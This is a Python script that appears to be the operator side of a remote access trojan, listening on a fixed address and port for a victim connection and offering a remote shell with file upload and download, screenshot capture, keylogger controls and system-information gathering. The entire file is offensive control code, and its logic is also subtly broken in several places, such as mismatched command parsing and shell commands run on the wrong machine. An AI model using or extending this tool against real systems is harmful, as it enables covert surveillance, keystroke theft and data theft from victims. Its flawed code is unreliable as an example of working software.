import socket
from termcolor import colored
import json
import os
import base64
import re
import platform
import subprocess
import datetime

count = 1

def reliable_send(data):
    jsonData = json.dumps(data)
    target.send(jsonData.encode())

def reliable_recv():
    data = b''
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def parse_command(command):
    
    parsed_command = command.split(' ')
    return parsed_command[0], parsed_command[1:]

def execute_command(command):
    if command == 'exit':
        return None, None

    elif command == 'cd':
        return 'cd', None

    elif command[0] == 'download':
        return 'download', command[1]

    elif command[0] == 'upload':
        return 'upload', command[1]

    elif command[0] == 'screenshot':
        return 'screenshot', None

    elif command == 'keylog start':
        return 'keylog_start', None

    elif command == 'keylog stop':
        return 'keylog_stop', None

    elif command == 'sysinfo':
        return 'sysinfo', None

    else:
        return 'shell_command', command

def handle_cd(arguments):
    if arguments:
        os.chdir(' '.join(arguments))
    return os.getcwd()

def handle_download(arguments):
    filename = arguments[0]
    with open(filename, "wb") as download:
        fileData = reliable_recv()
        download.write(base64.b64decode(fileData))

def handle_upload(arguments):
    filename = arguments[0]
    try:
        with open(filename, "rb") as upload:
            reliable_send(base64.b64encode(upload.read()))
    except Exception as e:
        failed = f'[-] Failed to Upload: {str(e)}'
        reliable_send(base64.b64encode(failed))

def handle_screenshot(arguments):
    with open(f"screenshot{count}.png", "wb") as sc:
        image = reliable_recv()
        imageDecode = base64.b64decode(image)
        if imageDecode[:3] == "[-]":
            print(image)
        else:
            sc.write(image)
            count += 1

def handle_keylog_start(arguments):
    pass  

def handle_sysinfo(arguments):
    sysinfo = {
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version(),
        'Current Directory': os.getcwd(),
        'Username': os.getlogin() if platform.system() == 'Windows' else os.getlogin(),
        'Date': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'Uptime': subprocess.getoutput('uptime') if platform.system() != 'Windows' else None
    }
    return sysinfo

def execute_shell_command(command):
    result = subprocess.getoutput(command)
    return result

def shell():
    global count
    while True:
        command = input("Shell#~%s: " % str(ip))
        parsed_command, arguments = parse_command(command)
        action, argument = execute_command(parsed_command)

        if action is None:
            break

        if action == 'cd':
            result = handle_cd(arguments)
        elif action == 'download':
            handle_download(arguments)
            result = f'Downloaded {arguments[0]} successfully'
        elif action == 'upload':
            handle_upload(arguments)
            result = f'Uploaded {arguments[0]} successfully'
        elif action == 'screenshot':
            handle_screenshot(arguments)
            result = 'Screenshot captured'
        elif action == 'keylog_start':
            handle_keylog_start(arguments)
            result = 'Keylogger started'
        elif action == 'keylog_stop':
            result = 'Keylogger stopped'
        elif action == 'sysinfo':
            result = handle_sysinfo(arguments)
        elif action == 'shell_command':
            result = execute_shell_command(command)

        print(result)

def server():
    global sock
    global ip
    global target

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("192.168.7.125", 54321))
    sock.listen(5)
    print(colored("[!] Listening For Incoming Connections", "yellow"))
    target, ip = sock.accept()
    print(colored("[+] Connection Established From : %s" % str(ip), "green"))

server()
shell()
sock.close()